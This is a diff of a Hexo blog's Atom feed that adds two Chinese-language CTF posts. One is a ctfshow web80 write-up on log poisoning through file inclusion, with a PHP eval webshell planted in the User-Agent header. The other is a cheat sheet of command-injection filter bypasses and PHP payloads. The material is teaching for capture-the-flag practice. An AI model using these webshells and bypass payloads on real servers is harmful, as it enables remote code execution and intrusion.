@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>mywebside</title>
+  <title>MyBlog</title>
   
-  <subtitle>mywebside</subtitle>
-  <link href="http://example.com/atom.xml" rel="self"/>
+  <subtitle>MyBlog</subtitle>
+  <link href="http://1768161086.github,io/atom.xml" rel="self"/>
   
-  <link href="http://example.com/"/>
-  <updated>2025-01-20T08:24:12.722Z</updated>
-  <id>http://example.com/</id>
+  <link href="http://1768161086.github,io/"/>
+  <updated>2025-01-21T02:44:35.630Z</updated>
+  <id>http://1768161086.github,io/</id>
   
   <author>
     <name>userq</name>
@@ -17,24 +17,61 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>命令执行相关知识点</title>
-    <link href="http://example.com/2025/01/20/new/"/>
-    <id>http://example.com/2025/01/20/new/</id>
-    <published>2025-01-20T08:20:55.000Z</published>
-    <updated>2025-01-20T08:24:12.722Z</updated>
+    <title>ctfshow web80文件包含</title>
+    <link href="http://1768161086.github,io/2025/01/21/one/"/>
+    <id>http://1768161086.github,io/2025/01/21/one/</id>
+    <published>2025-01-21T01:21:08.000Z</published>
+    <updated>2025-01-21T02:44:35.630Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>向 Nginx 服务器发送请求时，记录会保存在 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 日志文件。那就可以传递一句话木马，保存在日志中，然后再包含日志文件，日志中的一句话木马就运行了。</p></blockquote><span id="more"></span><p>web80<br><img src="file:///C:/Users/xu/hexo-blog/source/_posts/one/origin.png" alt="origin"></p><p>做题之前需要了解：<br>对于Apache，日志存放路径：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log<br>对于Ngnix，日志存放路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 和 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log </p><p>读一下这个日志文件：用get传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/xu/hexo-blog/source/_posts/one/1.png" alt="1"></p><p>中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。</p><p>从上面的日志信息可以看出是 User-Agent 的内容，我们在 User-Agent 里插入一句话木马进行提交 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/xu/hexo-blog/source/_posts/one/2.png" alt="2"></p><p>访问日志文件，尝试进行进行命令执行获取flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attack=system(&#x27;tac fl0g.php&#x27;);</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/xu/hexo-blog/source/_posts/one/3.png" alt="3"></p>]]></content>
     
     
-    <summary type="html">ctf中常用的命令执行知识点总结</summary>
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;向 Nginx 服务器发送请求时，记录会保存在 &amp;#x2F;var&amp;#x2F;log&amp;#x2F;nginx&amp;#x2F;access.log 日志文件。那就可以传递一句话木马，保存在日志中，然后再包含日志文件，日志中的一句话木马就运行了。&lt;/p&gt;
+&lt;/blockquote&gt;</summary>
     
     
     
+    
+    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
+    
+    <category term="原创" scheme="http://1768161086.github,io/tags/%E5%8E%9F%E5%88%9B/"/>
+    
+    <category term="文件包含" scheme="http://1768161086.github,io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>命令执行相关知识点解释</title>
+    <link href="http://1768161086.github,io/2025/01/20/new/"/>
+    <id>http://1768161086.github,io/2025/01/20/new/</id>
+    <published>2025-01-20T08:20:55.758Z</published>
+    <updated>2025-01-21T01:32:03.395Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>ctf中命令执行相关知识点总结</p></blockquote><span id="more"></span><h1 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1.过滤空格"></a>1.过滤空格</h1><p>可以用%09、%0a、${IFS}、$IFS$9 、%20、重定向符&lt;&gt;</p><h1 id="2-过滤关键字-cat、flag等"><a href="#2-过滤关键字-cat、flag等" class="headerlink" title="2.过滤关键字(cat、flag等)"></a>2.过滤关键字(cat、flag等)</h1><p>(1)过滤的字符串中加入单引号、双引号或反斜杠（ca’’t、ca””t、ca\t）</p><p>(2)$(print”\x6c\x73”)&#x3D;&#x3D;ls;利用printf+16进制输出ls,用括号外输出ls,等用于反斜杠<code>printf&quot;\x6c\x73&quot;</code>;</p><p>(3)echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash利用base64绕过；</p><p>(4)利用通配符：*&#x2F;?</p><p>(5)利用为协议：c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain或c&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>(6)为协议+base64绕过：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><h2 id="相关命令："><a href="#相关命令：" class="headerlink" title="相关命令："></a>相关命令：</h2><p>1.?c&#x3D;system(“tac%20fla*”);<br>2.?c&#x3D;echo%20<code>tac%20fla*</code>;<br>3.?c&#x3D;eval($_GET[1]);&amp;1&#x3D;phpinfo();<br>4.?c&#x3D;system(“cp%20fl<em>g.php%20a.txt%20”);<br>5.?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>6.?c&#x3D;include”$_GET[a]”?&gt;&amp;a&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可<br>7.?c&#x3D;include$_GET[v]?&gt;&amp;v&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?><br>8.?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;<br>9.?c&#x3D;eval(array_pop(next(get_defined_vars())));需要POST传入参数为1&#x3D;system(‘tac fl</em>‘);<br>10.?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><h1 id="3-过滤-c-a-t"><a href="#3-过滤-c-a-t" class="headerlink" title="3.过滤*c *a *t"></a>3.过滤*<em>c</em> *<em>a</em> *t</h1><p>利用c&#x3D;grep${IFS}show${IFS}fl?g.php或者c&#x3D;mv${IFS}fl?g.php${IFS}a.txt</p><p>grep命令是文本搜索命令并用show返回</p><p>mv命令的意图是将文件 <code>fl?g.php</code> 重命名为 <code>a.txt</code>。</p><h1 id="4-过滤字母-a-z"><a href="#4-过滤字母-a-z" class="headerlink" title="4.过滤字母[a-z]"></a>4.过滤字母[a-z]</h1><p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???也就是?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><h1 id="5-过滤字母数字空格"><a href="#5-过滤字母数字空格" class="headerlink" title="5.过滤字母数字空格"></a>5.过滤字母数字空格</h1><p>?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[] 等效 &#x2F;tmp&#x2F;phpxxxxxx</p><h1 id="6-过滤system"><a href="#6-过滤system" class="headerlink" title="6.过滤system"></a>6.过滤system</h1><p>show_source(‘’);或者highlight_file(‘flag.php’);或readgzfile(“&#x2F;flag.txt”);或include或require或c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt</p><h1 id="7-查看当前目录"><a href="#7-查看当前目录" class="headerlink" title="7.查看当前目录"></a>7.查看当前目录</h1><p>c&#x3D;print_r(scandir或glob(“&#x2F;“));或var_dump(scandir(“&#x2F;“));或var_export(scandir(“&#x2F;“));或</p><p>$a &#x3D; new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”); &#x2F;&#x2F; 创建一个DirectoryIterator对象，遍历根目录<br>foreach ($a as $f) { &#x2F;&#x2F; 遍历每个条目;echo($f-&gt;__toString() . ‘ ‘); &#x2F;&#x2F; 输出条目的名称，并添加一个空格};exit(0); &#x2F;&#x2F; 终止脚本执行</p><h1 id="8-字母-数字别替成？"><a href="#8-字母-数字别替成？" class="headerlink" title="8.字母&#x2F;数字别替成？"></a>8.字母&#x2F;数字别替成？</h1><p>命令后+ob_flush();或ob_end_flush();或exit();或die();</p><hr>]]></content>
+    
+    
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;ctf中命令执行相关知识点总结&lt;/p&gt;
+&lt;/blockquote&gt;</summary>
+    
+    
+    
+    <category term="web" scheme="http://1768161086.github,io/categories/web/"/>
+    
+    
+    <category term="web" scheme="http://1768161086.github,io/tags/web/"/>
+    
+    <category term="http" scheme="http://1768161086.github,io/tags/http/"/>
+    
+    <category term="命令执行" scheme="http://1768161086.github,io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
   <entry>
     <title>Hello World</title>
-    <link href="http://example.com/2025/01/14/hello-world/"/>
-    <id>http://example.com/2025/01/14/hello-world/</id>
+    <link href="http://1768161086.github,io/2025/01/14/hello-world/"/>
+    <id>http://1768161086.github,io/2025/01/14/hello-world/</id>
     <published>2025-01-14T03:02:43.160Z</published>
     <updated>2025-01-14T03:02:43.160Z</updated>
     
